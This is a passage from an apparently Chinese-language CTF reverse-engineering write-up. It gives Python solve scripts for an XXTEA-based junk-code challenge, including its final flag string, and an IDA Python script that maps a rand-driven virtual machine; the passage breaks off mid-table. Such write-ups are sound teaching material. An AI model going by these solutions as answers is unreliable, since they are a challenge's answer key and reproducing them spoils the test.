class="hljs-number">32</span>):<br>        a2 += k3<br>        a2 &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>        v6 = v6 + <span class="hljs-number">0x100000000</span> - (((v7 + ((v7 &lt;&lt; <span class="hljs-number">5</span>) ^ (v7 &gt;&gt; <span class="hljs-number">6</span>))) ^ (key[(a2&gt;&gt;<span class="hljs-number">11</span>)&amp;<span class="hljs-number">3</span>]+a2) ^ <span class="hljs-number">0x33</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>)<br>        v6 &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>        v7 = v7 + <span class="hljs-number">0x100000000</span> - (((v6 + ((v6 &lt;&lt; <span class="hljs-number">4</span>) ^ (v6 &gt;&gt; <span class="hljs-number">5</span>))) ^ (key[a2&amp;<span class="hljs-number">3</span>]+a2) ^ <span class="hljs-number">0x44</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>)<br>        v7 &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    flag[i+<span class="hljs-number">1</span>] = v6<br>    flag[i] = v7<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(v7), <span class="hljs-built_in">hex</span>(v6))<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(f.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>).decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment"># fakeflag&#123;Is_there_anywhere_else&#125;</span><br></code></pre></td></tr></table></figure><p>跑出来发现是假flag<code>fakeflag&#123;Is_there_anywhere_else&#125;</code>，main里面是假校验，</p><p>分析发现注册了一个退出时调用的函数<code>sub_4016BC</code>，NOP去混淆反编译</p><p><img src="assets/2024-04-27-23-07-11-image.png"></p><p>这里才是真check，对xxtea加密后的flag移位异或，再跟真ans校验</p><p>移位的时候根据最高为决定移位后是否异或<code>0x84A6972F</code>，逆向看的时候注意最低位，异或<code>0x84A6972F</code>后最低位为1，否则为0，所以解密根据最低位判断是否异或<code>0x84A6972F</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = [<span class="hljs-number">0xB6DDB3A9</span>, <span class="hljs-number">0x36162C23</span>, <span class="hljs-number">0x1889FABF</span>, <span class="hljs-number">0x6CE4E73B</span>, <span class="hljs-number">0xA5AF8FC</span>, <span class="hljs-number">0x21FF8415</span>, <span class="hljs-number">0x44859557</span>, <span class="hljs-number">0x2DC227B7</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v0 = flag[i]<br>        <span class="hljs-keyword">if</span> ((v0 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">1</span>):<br>            v0 ^= <span class="hljs-number">0x84A6972F</span><br>            v0 = v0 &gt;&gt; <span class="hljs-number">1</span><br>            v0 |= <span class="hljs-number">0x80000000</span><br>        <span class="hljs-keyword">else</span>:<br>            v0 = v0 &gt;&gt; <span class="hljs-number">1</span><br>        flag[i] = v0<br></code></pre></td></tr></table></figure><p>继续xxtea解密得到真flag<code>d3ctf&#123;ea3yjunk_c0d3_4nd_ea5y_re&#125;</code></p><h2 id="RandomVm"><a href="#RandomVm" class="headerlink" title="RandomVm"></a>RandomVm</h2><p>srand设置随机数种子<code>0xD33B470</code>，假随机，可以直接把rand跑出来</p><p><img src="assets/2024-04-27-23-19-11-image.png"></p><p>大量函数都是上面的结构，先进行一段操作，再设置跳转表，rand一个随机数选择下一个执行的函数</p><p>每个函数对应一条虚拟机指令，控制流由跳转表和rand控制，需要分析每个函数的功能与跳转关系，100+函数手动分析是不可能的，用IDA Python解析一下</p><p>从入口开始解析，通过解析汇编指令获取跳转表，同时记录每个函数反编译的虚拟机指令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idc<br><span class="hljs-keyword">import</span> idaapi<br><br>start = <span class="hljs-number">0x717F</span><br><br>funcs = &#123;&#125;<br><span class="hljs-comment"># 递归找函数关系</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recur</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr))<br>    <span class="hljs-keyword">if</span> (addr == <span class="hljs-number">0x241A</span>):<br>        <span class="hljs-keyword">return</span><br>    ea = addr<br>    value_dic = &#123;&#125;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">True</span>):<br>        ins = idc.generate_disasm_line(ea, <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">if</span> (ins.startswith(<span class="hljs-string">&quot;mov&quot;</span>)):<br>            op0 = idc.print_operand(ea, <span class="hljs-number">0</span>)<br>            op1 = idc.print_operand(ea, <span class="hljs-number">1</span>)<br>            <span class="hljs-comment"># 过滤eax rax</span><br>            <span class="hljs-keyword">if</span> (op0[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;er&quot;</span>):<br>                op0 = op0[<span class="hljs-number">1</span>:]<br>            <span class="hljs-keyword">if</span> (op1[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;er&quot;</span>):<br>                op1 = op1[<span class="hljs-number">1</span>:]<br>            value_dic[op0] = op1<br>            value_dic[op0] = op1<br>            <span class="hljs-keyword">if</span> (op0.startswith(<span class="hljs-string">&quot;[rbp+var_&quot;</span>)):<br>                <span class="hljs-keyword">if</span> (op1[-<span class="hljs-number">1</span>] != <span class="hljs-string">&#x27;h&#x27;</span>):<br>                    value_dic[op0] = value_dic[op1]<br>        <span class="hljs-comment"># print(hex(ea), ins)</span><br>        <span class="hljs-keyword">if</span> (ins == <span class="hljs-string">&quot;call    _rand&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(value_dic) &gt;= <span class="hljs-number">10</span>):<br>            <span class="hljs-keyword">break</span><br>        ins_len = idc.create_insn(ea)<br>        ea += ins_len<br>    <span class="hljs-comment"># xor</span><br>    <span class="hljs-built_in">print</span>(value_dic)<br>    xor_ins = idc.print_operand(ea+<span class="hljs-number">0x36</span>, <span class="hljs-number">1</span>)[:-<span class="hljs-number">1</span>]<br>    xor = <span class="hljs-built_in">int</span>(xor_ins, <span class="hljs-number">16</span>)<br>    nexts = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;60&quot;</span>, <span class="hljs-string">&quot;58&quot;</span>, <span class="hljs-string">&quot;50&quot;</span>, <span class="hljs-string">&quot;48&quot;</span>, <span class="hljs-string">&quot;40&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>, <span class="hljs-string">&quot;30&quot;</span>, <span class="hljs-string">&quot;28&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>]:<br>        <span class="hljs-built_in">next</span> = <span class="hljs-built_in">int</span>(value_dic[<span class="hljs-string">f&quot;[rbp+var_<span class="hljs-subst">&#123;i&#125;</span>]&quot;</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">next</span> = ((<span class="hljs-built_in">next</span> ^ xor) + addr) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br>        nexts.append(<span class="hljs-built_in">next</span>)<br>    funcs[addr] = nexts<br>    <span class="hljs-keyword">for</span> <span class="hljs-built_in">next</span> <span class="hljs-keyword">in</span> nexts:<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">next</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> funcs):<br>            recur(<span class="hljs-built_in">next</span>)<br><br>ea = start<br>idc.set_name(ea, <span class="hljs-string">&quot;main_main&quot;</span>)<br>recur(ea)<br><span class="hljs-built_in">print</span>(funcs)<br><br><span class="hljs-keyword">for</span> ea <span class="hljs-keyword">in</span> funcs:<br>    src = <span class="hljs-built_in">str</span>(idaapi.decompile(ea)).split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ea)&#125;</span>: \&quot;<span class="hljs-subst">&#123;src[<span class="hljs-number">5</span>]&#125;</span>\&quot;,&quot;</span>)<br></code></pre></td></tr></table></figure><p>分析后得到所有函数的关系，以及每个函数对应的虚拟机指令，手动优化一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python">ops = &#123;<br><span class="hljs-number">0x717f</span>: ([<span class="hljs-number">0x6bc8</span>, <span class="hljs-number">0x340a</span>, <span class="hljs-number">0x2917</span>, <span class="hljs-number">0x2db3</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x16f8</span>, <span class="hljs-number">0x1e22</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x2db3</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x6bc8</span>: ([<span class="hljs-number">0x55a9</span>, <span class="hljs-number">0x604e</span>, <span class="hljs-number">0x3725</span>, <span class="hljs-number">0x2917</span>, <span class="hljs-number">0x1fb5</span>, <span class="hljs-number">0x2425</span>, <span class="hljs-number">0x6d19</span>, <span class="hljs-number">0x7095</span>, <span class="hljs-number">0x16f8</span>, <span class="hljs-number">0x26a4</span>], <span class="hljs-string">&quot;  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = ((int)*((unsigned __int8 *)&amp;flag + (unsigned __int8)r1) &gt;&gt; array[r0]) | (*((_BYTE *)&amp;flag + (unsigned __int8)r1) &lt;&lt; (8 - array[r0]));&quot;</span>),<br><span class="hljs-number">0x55a9</span>: ([<span class="hljs-number">0x5c94</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x40cb</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x40cb</span>, <span class="hljs-number">0x3f0e</span>, <span class="hljs-number">0x6154</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x5c94</span>: ([<span class="hljs-number">0x1cd0</span>, <span class="hljs-number">0x3308</span>, <span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x1e22</span>, <span class="hljs-number">0x1cd0</span>, <span class="hljs-number">0x16f8</span>, <span class="hljs-number">0x16f8</span>, <span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x44aa</span>], <span class="hljs-string">&quot;  --r0;&quot;</span>),<br><span class="hljs-number">0x1cd0</span>: ([<span class="hljs-number">0x3f0e</span>, <span class="hljs-number">0x41aa</span>, <span class="hljs-number">0x66a4</span>, <span class="hljs-number">0x3a4b</span>, <span class="hljs-number">0x481b</span>, <span class="hljs-number">0x7375</span>, <span class="hljs-number">0x7375</span>, <span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x51ff</span>, <span class="hljs-number">0x5f5c</span>], <span class="hljs-string">&quot;  array[r0] = syscall((char)array[r0], (unsigned int)(char)array[r0 + 1], &amp;array[r0 + 2], (unsigned int)(char)array[r0 + 3]);&quot;</span>),<br><span class="hljs-number">0x3f0e</span>: ([<span class="hljs-number">0x2917</span>, <span class="hljs-number">0x2917</span>, <span class="hljs-number">0x3bf0</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x55a9</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x3bf0</span>, <span class="hljs-number">0x3f0e</span>, <span class="hljs-number">0x3959</span>, <span class="hljs-number">0x3f0e</span>], <span class="hljs-string">&quot;  ++r0;&quot;</span>),<br><span class="hljs-number">0x2917</span>: ([<span class="hljs-number">0x340a</span>, <span class="hljs-number">0x43c2</span>, <span class="hljs-number">0x3e48</span>, <span class="hljs-number">0x24db</span>, <span class="hljs-number">0x24db</span>, <span class="hljs-number">0x1ee8</span>, <span class="hljs-number">0x55a9</span>, <span class="hljs-number">0x5002</span>, <span class="hljs-number">0x2425</span>, <span class="hljs-number">0x2771</span>], <span class="hljs-string">&quot;  *((_BYTE *)&amp;flag + (unsigned __int8)r1) ^= array[r0];&quot;</span>),<br><span class="hljs-number">0x340a</span>: ([<span class="hljs-number">0x3f0e</span>, <span class="hljs-number">0x25b1</span>, <span class="hljs-number">0x42fc</span>, <span class="hljs-number">0x51ff</span>, <span class="hljs-number">0x3f0e</span>, <span class="hljs-number">0x5676</span>, <span class="hljs-number">0x64d3</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-number">0x3f0e</span>, <span class="hljs-number">0x3959</span>], <span class="hljs-string">&quot;  array[r0] = syscall((char)array[r0], (unsigned int)(char)array[r0 + 1], &amp;array[r0 + 2], (unsigned int)(char)array[r0 + 3]);&quot;</span>),<br><span class="hljs-number">0x25b1</span>: ([<span class="hljs-number">0x24db</span>, <span class="hljs-number">0x7809</span>, <span class="hljs-number">0x42fc</span>, <span class="hljs-number">0x5baf</span>, <span class="hljs-number">0x1ee8</span>, <span class="hljs-number">0x26a4</span>, <span class="hljs-number">0x4570</span>, <span class="hljs-number">0x5baf</span>, <span class="hljs-number">0x284a</span>, <span class="hljs-number">0x340a</span>], <span class="hljs-string">&quot;  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = array[r0];&quot;</span>),<br><span class="hljs-number">0x24db</span>: ([<span class="hljs-number">0x5754</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x3f0e</span>, <span class="hljs-number">0x42fc</span>, <span class="hljs-number">0x3d82</span>, <span class="hljs-number">0x7462</span>, <span class="hljs-number">0x3b11</span>, <span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x2db3</span>, <span class="hljs-number">0x7375</span>], <span class="hljs-string">&quot;  array[r0] = 0;&quot;</span>),<br><span class="hljs-number">0x5754</span>: ([<span class="hljs-number">0x3876</span>, <span class="hljs-number">0x7809</span>, <span class="hljs-number">0x2261</span>, <span class="hljs-number">0x2261</span>, <span class="hljs-number">0x51ff</span>, <span class="hljs-number">0x6bc8</span>, <span class="hljs-number">0x340a</span>, <span class="hljs-number">0x51ff</span>, <span class="hljs-number">0x2261</span>, <span class="hljs-number">0x51ff</span>], <span class="hljs-string">&quot;  --array[r0];&quot;</span>),<br><span class="hljs-number">0x3876</span>: ([<span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x196d</span>, <span class="hljs-number">0x6ed7</span>, <span class="hljs-number">0x3876</span>, <span class="hljs-number">0x5002</span>, <span class="hljs-number">0x7462</span>, <span class="hljs-number">0x196d</span>, <span class="hljs-number">0x7462</span>, <span class="hljs-number">0x6ed7</span>, <span class="hljs-number">0x4a13</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x2cd4</span>: ([<span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x3725</span>, <span class="hljs-number">0x6154</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-number">0x196d</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x2182</span>, <span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x6154</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x63d2</span>: ([<span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x5c94</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x472e</span>, <span class="hljs-number">0x1bf1</span>, <span class="hljs-number">0x43c2</span>, <span class="hljs-number">0x679b</span>, <span class="hljs-number">0x196d</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x7462</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x1b12</span>: ([<span class="hljs-number">0x6154</span>, <span class="hljs-number">0x7462</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x6ed7</span>, <span class="hljs-number">0x2f84</span>, <span class="hljs-number">0x2e92</span>, <span class="hljs-number">0x3137</span>, <span class="hljs-number">0x4a13</span>, <span class="hljs-number">0x4a13</span>, <span class="hljs-number">0x1bf1</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x6154</span>: ([<span class="hljs-number">0x6ed7</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x4a13</span>, <span class="hljs-number">0x6ed7</span>, <span class="hljs-number">0x5aa9</span>, <span class="hljs-number">0x5aa9</span>, <span class="hljs-number">0x43c2</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x679b</span>, <span class="hljs-number">0x3137</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x6ed7</span>: ([<span class="hljs-number">0x209a</span>, <span class="hljs-number">0x2337</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x6ed7</span>, <span class="hljs-number">0x3fd4</span>, <span class="hljs-number">0x6a77</span>, <span class="hljs-number">0x68a6</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x3876</span>, <span class="hljs-number">0x6ed7</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x209a</span>: ([<span class="hljs-number">0x5002</span>, <span class="hljs-number">0x3b11</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-number">0x3216</span>, <span class="hljs-number">0x5103</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x4570</span>, <span class="hljs-number">0x5002</span>, <span class="hljs-number">0x5aa9</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x5002</span>: ([<span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x604e</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-number">0x6154</span>, <span class="hljs-number">0x2182</span>, <span class="hljs-number">0x196d</span>, <span class="hljs-number">0x4570</span>, <span class="hljs-number">0x4570</span>, <span class="hljs-number">0x3876</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x5f5c</span>: ([<span class="hljs-number">0x7462</span>, <span class="hljs-number">0x2182</span>, <span class="hljs-number">0x5e5b</span>, <span class="hljs-number">0x5e5b</span>, <span class="hljs-number">0x1bf1</span>, <span class="hljs-number">0x2182</span>, <span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x6a77</span>, <span class="hljs-number">0x7541</span>, <span class="hljs-number">0x5f5c</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x7462</span>: ([<span class="hljs-number">0x4570</span>, <span class="hljs-number">0x188f</span>, <span class="hljs-number">0x5e5b</span>, <span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x5002</span>, <span class="hljs-number">0x7462</span>, <span class="hljs-number">0x196d</span>, <span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x3876</span>, <span class="hljs-number">0x4570</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x4570</span>: ([<span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x52ed</span>, <span class="hljs-number">0x5002</span>, <span class="hljs-number">0x4570</span>, <span class="hljs-number">0x3876</span>, <span class="hljs-number">0x209a</span>, <span class="hljs-number">0x604e</span>, <span class="hljs-number">0x16f8</span>, <span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x5f5c</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x65c5</span>: ([<span class="hljs-number">0x2337</span>, <span class="hljs-number">0x52ed</span>, <span class="hljs-number">0x5002</span>, <span class="hljs-number">0x6ed7</span>, <span class="hljs-number">0x5e5b</span>, <span class="hljs-number">0x2337</span>, <span class="hljs-number">0x7462</span>, <span class="hljs-number">0x5c94</span>, <span class="hljs-number">0x52ed</span>, <span class="hljs-number">0x196d</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x2337</span>: ([<span class="hljs-number">0x2337</span>, <span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x196d</span>, <span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x196d</span>, <span class="hljs-number">0x3725</span>, <span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x604e</span>, <span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x5f5c</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x4f23</span>: ([<span class="hljs-number">0x16f8</span>, <span class="hljs-number">0x2db3</span>, <span class="hljs-number">0x3058</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x3b11</span>, <span class="hljs-number">0x3b11</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x188f</span>, <span class="hljs-number">0x604e</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x16f8</span>: ([<span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x340a</span>, <span class="hljs-number">0x1a4c</span>, <span class="hljs-number">0x5c94</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x5c94</span>, <span class="hljs-number">0x1cd0</span>, <span class="hljs-number">0x5c94</span>, <span class="hljs-number">0x6a77</span>], <span class="hljs-string">&quot;  --r0;&quot;</span>),<br><span class="hljs-number">0x6fb6</span>: ([<span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x40cb</span>, <span class="hljs-number">0x5e5b</span>, <span class="hljs-number">0x66a4</span>, <span class="hljs-number">0x604e</span>, <span class="hljs-number">0x2db3</span>, <span class="hljs-number">0x2db3</span>, <span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x6df8</span>, <span class="hljs-number">0x66a4</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x40cb</span>: ([<span class="hljs-number">0x3725</span>, <span class="hljs-number">0x3725</span>, <span class="hljs-number">0x6233</span>, <span class="hljs-number">0x40cb</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x6d19</span>, <span class="hljs-number">0x7375</span>, <span class="hljs-number">0x66a4</span>, <span class="hljs-number">0x464f</span>, <span class="hljs-number">0x40cb</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x3725</span>: ([<span class="hljs-number">0x55a9</span>, <span class="hljs-number">0x2917</span>, <span class="hljs-number">0x5e5b</span>, <span class="hljs-number">0x48fe</span>, <span class="hljs-number">0x2425</span>, <span class="hljs-number">0x2b07</span>, <span class="hljs-number">0x136e</span>, <span class="hljs-number">0x2337</span>, <span class="hljs-number">0x724c</span>, <span class="hljs-number">0x66a4</span>], <span class="hljs-string">&quot;  *((_BYTE *)&amp;flag + (unsigned __int8)r1) = ((int)*((unsigned __int8 *)&amp;flag + (unsigned __int8)r1) &gt;&gt; array[r0]) | (*((_BYTE *)&amp;flag + (unsigned __int8)r1) &lt;&lt; (8 - array[r0]));&quot;</span>),<br><span class="hljs-number">0x5e5b</span>: ([<span class="hljs-number">0x5002</span>, <span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x2337</span>, <span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x196d</span>, <span class="hljs-number">0x1b12</span>, <span class="hljs-number">0x2182</span>, <span class="hljs-number">0x1bf1</span>, <span class="hljs-number">0x5e5b</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x196d</span>: ([<span class="hljs-number">0x5f5c</span>, <span class="hljs-number">0x604e</span>, <span class="hljs-number">0x2cd4</span>, <span class="hljs-number">0x63d2</span>, <span class="hljs-number">0x3876</span>, <span class="hljs-number">0x3876</span>, <span class="hljs-number">0x5e5b</span>, <span class="hljs-number">0x6154</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x5e5b</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x604e</span>: ([<span class="hljs-number">0x2182</span>, <span class="hljs-number">0x66a4</span>, <span class="hljs-number">0x3876</span>, <span class="hljs-number">0x52ed</span>, <span class="hljs-number">0x188f</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x62f3</span>, <span class="hljs-number">0x4f23</span>, <span class="hljs-number">0x2337</span>, <span class="hljs-number">0x4570</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x2182</span>: ([<span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x52ed</span>, <span class="hljs-number">0x3876</span>, <span class="hljs-number">0x2182</span>, <span class="hljs-number">0x2337</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x2182</span>, <span class="hljs-number">0x5927</span>, <span class="hljs-number">0x3725</span>, <span class="hljs-number">0x5e5b</span>], <span class="hljs-string">&quot;  ++array[r0];&quot;</span>),<br><span class="hljs-number">0x52ed</span>: ([<span class="hljs-number">0x3b11</span>, <span class="hljs-number">0x52ed</span>, <span class="hljs-number">0x2182</span>, <span class="hljs-number">0x188f</span>, <span class="hljs-number">0x6fb6</span>, <span class="hljs-number">0x52ed</span>, <span class="hljs-number">0x65c5</span>, <span class="hljs-number">0x3b11</span>, <span class="hljs-number">0x188f</span>, <span class="hljs-number">0x52ed</span>], <span 